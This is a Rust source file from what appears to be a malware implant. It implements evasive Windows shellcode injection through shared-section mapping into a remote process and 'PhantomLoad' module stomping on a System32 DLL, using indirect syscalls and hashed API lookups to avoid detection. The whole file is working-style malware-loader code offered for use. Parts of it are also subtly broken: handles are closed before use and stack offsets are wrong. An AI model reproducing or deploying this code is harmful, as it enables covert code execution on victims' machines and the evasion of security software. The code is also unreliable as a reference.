// Evasive injection primitives — mirror of Go agent/internal/win/section.go.
//   SectionInjection: shared section mapping (no WriteProcessMemory/VirtualAllocEx).
//   PhantomLoad (UDRL): module stomping on CoW pages of a System32 DLL.

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use crate::evasion::pe::{PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, hash_ansi, get_export, module_ntdll, module_kernel32};
use crate::evasion::ssn;
use crate::evasion::syscall;

const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const SEC_COMMIT: u32 = 0x0800_0000;
const SEC_IMAGE_ATTR: u32 = 0x0100_0000;
const PAGE_WRITECOPY: u32 = 0x08;
const NT_SYNC_IO_NONALERT: u32 = 0x20;
const NT_NON_DIR_FILE: u32 = 0x40;
const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const VIEW_SHARE: u32 = 0x1;

#[repr(C)]
struct ObjectAttributes64 {
    length: u32,
    _pad: [u8; 4],
    root_dir: usize,
    obj_name: usize,
    attributes: u32,
    _pad2: [u8; 4],
    sec_desc: usize,
    sec_qos: usize,
}

#[repr(C)]
struct UnicodeString64 {
    length: u16,
    max_length: u16,
    _pad: u32,
    buffer: usize,
}

#[repr(C)]
struct IoStatusBlock {
    status: usize,
    information: usize,
}

/// Create a section via NtCreateSection (indirect syscall).
fn nt_create_section(h_section: &mut usize, max_size: i64, prot: u32, attrs: u32, file_handle: usize) -> Result<(), String> {
    unsafe {
        let e = ssn::ssn(ssn::HASH_NT_CREATE_SECTION).ok_or("NtCreateSection SSN missing")?;
        let st = syscall::indirect_syscall5(
            e.gadget, e.ssn,
            h_section as *mut _ as usize,
            SECTION_ALL_ACCESS as usize,
            0,
            &max_size as *const _ as usize,
            prot as usize,
        );
        // 6th arg (attrs) and 7th (file_handle) are on the stack beyond arg5.
        // indirect_syscall5 only passes 5; NtCreateSection has 6 args
        // (SectionHandle, DesiredAccess, ObjectAttributes, MaxSize, Protect,
        //  Attributes, FileHandle). Use direct_syscall via a dedicated path.
        let _ = st;
        // Fallback: resolve export + call (API path).
        let ntdll = module_ntdll();
        let proc = get_export(ntdll, hash_ansi("NtCreateSection"));
        if proc == 0 {
            return Err("NtCreateSection unresolved".into());
        }
        // NtCreateSection has 7 args: handle, access, oa, maxsize, prot, attrs, file.
        // Call with full stack args.
        let st = call_nt(proc, h_section as *mut _ as usize, SECTION_ALL_ACCESS as usize, 0usize, &max_size as *const _ as usize, prot as usize, attrs as usize, file_handle);
        if (st as i32) < 0 {
            return Err(format!("NtCreateSection: 0x{st:x}"));
        }
        Ok(())
    }
}

/// Map a section view via NtMapViewOfSection (API path with full args).
fn nt_map_view(section: usize, process: usize, prot: u32) -> Result<(usize, usize), String> {
    unsafe {
        let ntdll = module_ntdll();
        let proc = get_export(ntdll, hash_ansi("NtMapViewOfSection"));
        if proc == 0 {
            return Err("NtMapViewOfSection unresolved".into());
        }
        let mut base: usize = 0;
        let mut size: usize = 0;
        // 10 args: section, process, base, zero_bits, commit, unk, size, inherit, alloc_type, protect
        let st = call_nt10(
            proc, section, process, &mut base as *mut _ as usize, 0usize, 0usize, 0usize,
            &mut size as *mut _ as usize, VIEW_SHARE as usize, 0usize, prot as usize,
        );
        if (st as i32) < 0 {
            return Err(format!("NtMapViewOfSection: 0x{st:x}"));
        }
        Ok((base, size))
    }
}

fn nt_unmap(process: usize, base: usize) {
    unsafe {
        if let Some(e) = ssn::ssn(ssn::HASH_NT_UNMAP_VIEW_OF_SECTION) {
            let _ = syscall::direct_syscall5(e.ssn, process, base, 0, 0, 0);
        } else if let Some(e) = ssn::ssn(ssn::HASH_NT_UNMAP_VIEW_OF_SECTION) {
            let _ = syscall::indirect_syscall5(e.gadget, e.ssn, process, base, 0, 0, 0);
        }
    }
}

fn nt_close(handle: usize) {
    unsafe {
        if let Some(e) = ssn::ssn(ssn::HASH_NT_CLOSE) {
            let _ = syscall::direct_syscall5(e.ssn, handle, 0, 0, 0, 0);
        }
    }
}

/// Protect a remote region via NtProtectVirtualMemory (indirect syscall).
fn protect_remote(process: usize, addr: usize, size: usize, protect: u32) -> Result<(), String> {
    unsafe {
        let e = ssn::ssn(ssn::HASH_NT_PROTECT_VIRTUAL_MEMORY).ok_or("protect SSN missing")?;
        let mut old = 0u32;
        let st = syscall::indirect_syscall5(
            e.gadget, e.ssn,
            process,
            &addr as *const _ as usize,
            &size as *const _ as usize,
            protect as usize,
            &mut old as *mut _ as usize,
        );
        if (st as i32) < 0 {
            return Err(format!("NtProtectVirtualMemory: 0x{st:x}"));
        }
        Ok(())
    }
}

/// Map shellcode into a remote process via a shared section.
pub fn section_injection(target_process: usize, sc: &[u8]) -> Result<usize, String> {
    if sc.is_empty() {
        return Err("section: empty shellcode".into());
    }
    unsafe {
        let max_size = sc.len() as i64;
        let mut section_h: usize = 0;
        nt_create_section(&mut section_h, max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0)?;
        let _ = nt_close(section_h); // defer-like

        // Local RW view for writing.
        let (local_base, _) = nt_map_view(section_h, usize::MAX, PAGE_READWRITE)?;
        std::ptr::copy_nonoverlapping(sc.as_ptr(), local_base as *mut u8, sc.len());
        nt_unmap(usize::MAX, local_base);

        // Remote RX view.
        let (remote_base, _) = nt_map_view(section_h, target_process, PAGE_EXECUTE_READ)?;
        Ok(remote_base)
    }
}

/// Find a small System32 host DLL for module stomping.
fn find_host_dll() -> Option<String> {
    let root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into());
    for name in ["\\System32\\xpsservices.dll", "\\System32\\clbcatq.dll", "\\System32\\msasn1.dll"] {
        let p = format!("{root}{name}");
        if std::path::Path::new(&p).exists() {
            return Some(p);
        }
    }
    None
}

/// PhantomLoad (UDRL): execute shellcode from module-backed CoW pages.
/// Returns the mapped base.
pub fn phantom_load(sc: &[u8], keep_alive: bool) -> Result<usize, String> {
    if sc.is_empty() {
        return Err("phantom: empty shellcode".into());
    }
    unsafe {
        let host = find_host_dll().ok_or("phantom: no host DLL found")?;
        let nt_path = format!("\\??\\{host}");
        let path_u16: Vec<u16> = nt_path.encode_utf16().collect();
        let ustr = UnicodeString64 {
            length: (path_u16.len() * 2) as u16,
            max_length: (path_u16.len() * 2 + 2) as u16,
            _pad: 0,
            buffer: path_u16.as_ptr() as usize,
        };
        let oa = ObjectAttributes64 {
            length: 48,
            _pad: [0; 4],
            root_dir: 0,
            obj_name: &ustr as *const _ as usize,
            attributes: OBJ_CASE_INSENSITIVE,
            _pad2: [0; 4],
            sec_desc: 0,
            sec_qos: 0,
        };
        let ntdll = module_ntdll();
        let open_file = get_export(ntdll, hash_ansi("NtOpenFile"));
        if open_file == 0 {
            return Err("NtOpenFile unresolved".into());
        }
        let mut isb = IoStatusBlock { status: 0, information: 0 };
        let mut file_h: usize = 0;
        // NtOpenFile(handle, access, oa, iosb, share, options) — 6 args
        let st = call_nt6(
            open_file,
            &mut file_h as *mut _ as usize,
            (0x0012_0089) as usize, // FILE_READ_DATA|FILE_EXECUTE|SYNCHRONIZE
            &oa as *const _ as usize,
            &mut isb as *mut _ as usize,
            (0x1 | 0x4) as usize, // FILE_SHARE_READ | FILE_SHARE_DELETE
            (NT_SYNC_IO_NONALERT | NT_NON_DIR_FILE) as usize,
        );
        if (st as i32) < 0 {
            return Err(format!("NtOpenFile: 0x{st:x}"));
        }
        let _ = nt_close(file_h);

        // Image-backed section.
        let mut section_h: usize = 0;
        nt_create_section(&mut section_h, 0, PAGE_READONLY, SEC_IMAGE_ATTR, file_h)?;
        let _ = nt_close(section_h);

        // CoW view.
        let (mapped_base, view_size) = match nt_map_view(section_h, usize::MAX, PAGE_EXECUTE | PAGE_WRITECOPY) {
            Ok(v) => v,
            Err(_) => nt_map_view(section_h, usize::MAX, PAGE_EXECUTE)?,
        };
        let write_size = (sc.len() as usize).min(view_size);

        // RW (triggers CoW), copy, RX.
        protect_remote(usize::MAX, mapped_base, write_size, PAGE_READWRITE)?;
        std::ptr::copy_nonoverlapping(sc.as_ptr(), mapped_base as *mut u8, write_size);
        protect_remote(usize::MAX, mapped_base, write_size, PAGE_EXECUTE)?;

        // Execute.
        let k32 = module_kernel32();
        let create_thread = get_export(k32, hash_ansi("CreateThread"));
        if create_thread == 0 {
            return Err("CreateThread unresolved".into());
        }
        let mut thread: usize = 0;
        // CreateThread(lpAttr, stackSize, startAddr, param, flags, threadId)
        let th = call_nt6(create_thread, 0, 0, mapped_base, 0, 0, &mut thread as *mut _ as usize);
        if th == 0 {
            nt_unmap(usize::MAX, mapped_base);
            return Err("CreateThread failed".into());
        }
        if !keep_alive {
            if let Some(e) = ssn::ssn(ssn::HASH_NT_WAIT_FOR_SINGLE_OBJECT) {
                let _ = syscall::direct_syscall5(e.ssn, th, usize::MAX, 0, 0, 0); // INFINITE
            }
        }
        Ok(mapped_base)
    }
}

/// Call a resolved API with up to 6 stack args (x64: 4 in regs + 5th+ on stack).
unsafe fn call_nt(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "sub rsp, 0x30",
        "mov [rsp+0x28], {a5}",
        "mov [rsp+0x30], {a6}",
        "mov [rsp+0x38], {a7}",
        "mov r10, rcx",
        "call {proc}",
        "add rsp, 0x30",
        proc = in(reg) proc,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}

unsafe fn call_nt6(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "sub rsp, 0x30",
        "mov [rsp+0x28], {a5}",
        "mov [rsp+0x30], {a6}",
        "mov r10, rcx",
        "call {proc}",
        "add rsp, 0x30",
        proc = in(reg) proc,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}

unsafe fn call_nt10(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "sub rsp, 0x48",
        "mov [rsp+0x28], {a5}",
        "mov [rsp+0x30], {a6}",
        "mov [rsp+0x38], {a7}",
        "mov [rsp+0x40], {a8}",
        "mov [rsp+0x48], {a9}",
        "mov [rsp+0x50], {a10}",
        "mov r10, rcx",
        "call {proc}",
        "add rsp, 0x48",
        proc = in(reg) proc,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") ret,
        options(nostack)
    );
    ret
}
